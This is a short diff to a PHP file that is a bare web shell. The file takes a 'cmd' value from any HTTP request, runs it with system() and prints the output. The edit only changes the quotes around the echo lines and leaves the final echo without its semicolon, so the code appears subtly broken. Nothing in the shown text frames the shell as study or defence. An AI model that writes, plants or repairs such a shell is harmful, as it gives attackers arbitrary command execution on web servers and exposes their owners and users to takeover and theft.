@@ -1,10 +1,10 @@
 <?php
 if(isset($_REQUEST['cmd']))
 {
-    echo '<pre>;
+    echo "<pre>";
     $cmd=($_REQUEST['cmd']);
     system($cmd);
-    echo '</pre>';
+    echo "</pre>"
     die;
 }
 ?>
